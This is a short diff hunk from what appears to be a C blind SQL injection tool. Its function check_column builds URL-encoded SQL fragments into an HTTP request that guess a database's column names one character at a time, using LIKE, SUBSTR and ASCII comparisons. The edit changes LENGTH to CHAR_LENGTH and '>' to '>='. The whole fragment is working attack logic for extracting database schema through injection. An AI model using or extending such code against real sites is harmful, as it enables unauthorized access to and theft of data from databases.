@@ -259,7 +259,7 @@ bool check_column(const void *ctx) {
         "WHERE%%20LOWER%%28table_name%%29%%3dLOWER%%28%%27%s%%27%%29%%20" // %s = table_name
         "AND%%20column_name%%20LIKE%%20%%27%%25%s%%25%%27%%20" // %s = col_to_find
         "AND%%20column_name%%20LIKE%%20%%27%s%%25%%27%%20" // %s = discovered
-        "AND%%20LENGTH(column_name)>%i%%20"
+        "AND%%20CHAR_LENGTH(column_name)>%%3d%i%%20"
         "AND%%20ASCII(SUBSTR(column_name,%i,1))<%%3dASCII(%%27%s%%27)%%20"
         "LIMIT%%201;"
         " HTTP/1.1\r\n"
